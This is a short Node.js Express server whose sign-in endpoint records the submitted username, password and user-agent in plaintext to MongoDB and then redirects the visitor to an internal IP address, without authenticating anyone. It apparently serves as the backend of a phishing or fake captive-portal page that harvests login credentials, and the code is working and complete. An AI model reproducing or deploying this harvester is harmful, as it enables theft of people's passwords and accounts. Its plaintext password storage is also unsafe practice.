require('dotenv').config();
const express = require('express');
const bodyParser = require('body-parser');
const mongoose = require('mongoose');
const Message = require('./model/message')

const app = express();

app.use(bodyParser.urlencoded({extended: true}))

// app.use(express.static("public"));
app.use(express.static(__dirname + "/public/"));

// views
app.set('views', __dirname + '/views');

app.set('view engine', 'ejs');



//connect to mongoose
mongoose.connect(process.env.MONGODB);

app.get("/", function(req, res){
    res.sendFile(__dirname+"/index.html");
});

app.post("/auth/sign_in", async (req, res) =>{
    const username = req.body.user_name;
    const password = req.body.password;
    const userAgent = req.headers['user-agent'];

    try{
        const response = await Message.create({
            username,
            password,
            userAgent
        });
    } catch(err){
        throw err
    }

    res.redirect("http://10.240.1.87")
});


// start lister
let port = process.env.PORT;
if(port == null || port ==""){
    port = 9001;
}

//listener
app.listen(port, function(){
    console.log("Server has started: http://localhost:" + port);
    
});
//done